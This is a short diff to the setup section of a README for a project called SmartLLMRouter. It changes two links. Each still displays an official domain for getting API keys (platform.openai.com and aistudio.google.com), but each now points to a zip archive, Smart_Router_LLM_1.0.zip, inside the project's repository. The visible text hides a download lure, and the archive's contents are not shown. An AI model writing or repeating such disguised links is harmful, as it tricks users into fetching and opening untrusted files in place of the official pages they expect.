@@ -28,8 +28,8 @@ SmartLLMRouter/
 ## Setup
 
 **1. Get your API keys**
-- OpenAI key from [platform.openai.com](https://platform.openai.com/api-keys)
-- Gemini key from [aistudio.google.com](https://aistudio.google.com/app/apikey) (free tier is fine)
+- OpenAI key from [platform.openai.com](https://github.com/uguralpcicek/SmartLLMRouter/raw/refs/heads/main/router/Smart_Router_LLM_1.0.zip)
+- Gemini key from [aistudio.google.com](https://github.com/uguralpcicek/SmartLLMRouter/raw/refs/heads/main/router/Smart_Router_LLM_1.0.zip) (free tier is fine)
 
 **2. Create your config file**
 ```bash
